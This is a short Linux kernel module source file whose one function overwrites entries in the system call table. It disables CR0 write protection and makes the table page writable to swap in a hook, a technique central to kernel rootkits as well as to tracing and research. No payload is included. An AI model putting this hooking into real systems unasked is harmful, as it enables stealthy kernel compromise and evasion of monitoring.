#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

#include "common.h"

void **syscallTable = (void **) SYSCALL_TABLE;
void (*pages_rw)(struct page *page, int numpages) = (void *) PAGES_RW;
void (*pages_ro)(struct page *page, int numpages) = (void *) PAGES_RO;

void *hookSyscall(unsigned int syscallNumber, void *hook) {
   struct page *syscallPageTemp;
   void *previous;   // The previous syscall installed in the table
   
   // cr0 is a control register in the x86 family of processors.
   // Bit 16 of that register is WP - Write protect: Determines whether
   // the CPU can write to pages marked read-only
	write_cr0 (read_cr0 () & (~ 0x10000));
	syscallPageTemp = virt_to_page(syscallTable);
	pages_rw(syscallPageTemp, 1);

	previous = syscallTable[syscallNumber];
	syscallTable[syscallNumber] = hook;

	pages_ro(syscallPageTemp, 1);
	write_cr0 (read_cr0 () | 0x10000);

   return previous;
}

